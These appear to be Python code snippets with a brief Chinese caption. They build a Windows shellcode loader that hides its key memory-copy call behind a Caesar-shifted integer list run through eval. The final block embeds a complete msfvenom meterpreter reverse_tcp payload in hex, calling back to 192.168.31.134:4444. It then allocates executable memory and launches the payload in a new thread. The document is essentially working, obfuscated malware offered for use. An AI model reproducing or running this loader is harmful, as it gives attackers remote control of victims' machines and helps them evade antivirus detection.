```
sc = "ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))"
list1 = list(sc)
list2=[]
for i in list1:
    list2.append(ord(i)+1)
print(list2)
```

```
## ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))
list_decode_1 = [100, 117, 122, 113, 102, 116, 47, 120, 106, 111, 101, 109, 109, 47, 108, 102, 115, 111, 102, 109, 52, 51, 47, 83, 117, 109, 78, 112, 119, 102, 78, 102, 110, 112, 115, 122, 41, 100, 117, 122, 113, 102, 116, 47, 100, 96, 118, 106, 111, 117, 55, 53, 41, 115, 120, 121, 113, 98, 104, 102, 42, 45, 33, 100, 117, 122, 113, 102, 116, 47, 100, 115, 102, 98, 117, 102, 96, 116, 117, 115, 106, 111, 104, 96, 99, 118, 103, 103, 102, 115, 41, 99, 118, 103, 42, 45, 33, 109, 102, 111, 41, 99, 118, 103, 42, 42]
list_decode_2 = []
for i1 in list_decode_1:
    a = chr(i1-1)
    list_decode_2.append(a)
list_decode_3 = ''.join(list_decode_2)
eval(list_decode_3)
```

密码是1 ##凯撒密码   加密关键代码 

```
import ctypes

hex_string = "fc4883e4f0e8cc000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d08b4818448b4020504901d0e35648ffc9418b34884d31c94801d64831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115cc0a81f8641544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5"
## msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.31.134 lport=4444 -f hex


hex_pairs = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]
buf = bytes(int(pair, 16) for pair in hex_pairs)


ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64


rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)

## ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))
list_decode_1 = [100, 117, 122, 113, 102, 116, 47, 120, 106, 111, 101, 109, 109, 47, 108, 102, 115, 111, 102, 109, 52, 51, 47, 83, 117, 109, 78, 112, 119, 102, 78, 102, 110, 112, 115, 122, 41, 100, 117, 122, 113, 102, 116, 47, 100, 96, 118, 106, 111, 117, 55, 53, 41, 115, 120, 121, 113, 98, 104, 102, 42, 45, 33, 100, 117, 122, 113, 102, 116, 47, 100, 115, 102, 98, 117, 102, 96, 116, 117, 115, 106, 111, 104, 96, 99, 118, 103, 103, 102, 115, 41, 99, 118, 103, 42, 45, 33, 109, 102, 111, 41, 99, 118, 103, 42, 42]
list_decode_2 = []
for i1 in list_decode_1:
    a = chr(i1-1)
    list_decode_2.append(a)
list_decode_3 = ''.join(list_decode_2)
eval(list_decode_3)

handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)

ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
```
